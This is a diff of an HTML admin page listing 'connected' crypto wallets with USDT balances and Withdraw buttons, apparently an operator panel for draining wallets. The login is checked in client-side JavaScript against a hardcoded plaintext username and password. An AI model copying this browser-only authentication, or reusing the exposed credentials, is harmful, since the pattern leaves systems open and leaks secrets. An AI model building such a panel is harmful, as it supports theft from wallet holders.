@@ -1,32 +1,119 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Admin Panel - Wallet Logs</title>
-  <link rel="stylesheet" href="admin.css" />
+  <meta charset="UTF-8">
+  <title>Admin Panel - Connected Wallets</title>
+  <style>
+    body {
+      background: radial-gradient(circle at center, #1b1b1b 0%, #0f0f0f 100%);
+      font-family: Arial, sans-serif;
+      color: white;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    h2 {
+      margin-top: 30px;
+      color: #00ffcc;
+    }
+    table {
+      margin: 30px auto;
+      border-collapse: collapse;
+      width: 90%;
+      max-width: 900px;
+    }
+    th, td {
+      border: 1px solid #444;
+      padding: 12px;
+    }
+    th {
+      background-color: #222;
+      color: #00ffcc;
+    }
+    td {
+      background-color: #111;
+    }
+    .btn {
+      padding: 8px 16px;
+      background-color: #00cc66;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    #login-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    #login-box input {
+      padding: 10px;
+      font-size: 16px;
+      margin-bottom: 10px;
+      width: 250px;
+    }
+    #login-box button {
+      padding: 10px 20px;
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Admin Panel - Connected Wallets</h1>
-    <table id="walletTable">
-      <thead>
-        <tr>
-          <th>Address</th>
-          <th>Network</th>
-          <th>USDT Balance</th>
-          <th>Withdraw</th>
-        </tr>
-      </thead>
-      <tbody id="walletBody">
-        <!-- Rows get inserted dynamically -->
-      </tbody>
-    </table>
-  </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/@tronweb3/tronwallet-adapter/dist/index.min.js"></script>
-  <script src="admin.js"></script>
+<!-- Login Box -->
+<div id="login-box">
+  <h2>Admin Login</h2>
+  <input type="text" id="username" placeholder="Username">
+  <input type="password" id="password" placeholder="Password">
+  <button onclick="checkLogin()">Login</button>
+</div>
+
+<!-- Admin Panel -->
+<div id="admin-panel" style="display: none;">
+  <h2>Admin Panel - Connected Wallets</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>Address</th>
+        <th>Network</th>
+        <th>USDT Balance</th>
+        <th>Withdraw</th>
+      </tr>
+    </thead>
+    <tbody id="walletTable">
+      <tr>
+        <td>TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN</td>
+        <td>TRC-20</td>
+        <td>--</td>
+        <td><button class="btn">Withdraw</button></td>
+      </tr>
+      <tr>
+        <td>0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E</td>
+        <td>BEP-20</td>
+        <td>--</td>
+        <td><button class="btn">Withdraw</button></td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<script>
+  const correctUsername = "enre.atul";
+  const correctPassword = "Honda988701@";
+
+  function checkLogin() {
+    const username = document.getElementById("username").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (username === correctUsername && password === correctPassword) {
+      document.getElementById("login-box").style.display = "none";
+      document.getElementById("admin-panel").style.display = "block";
+    } else {
+      alert("Wrong username or password. Try again.");
+    }
+  }
+</script>
+
 </body>
 </html>
-
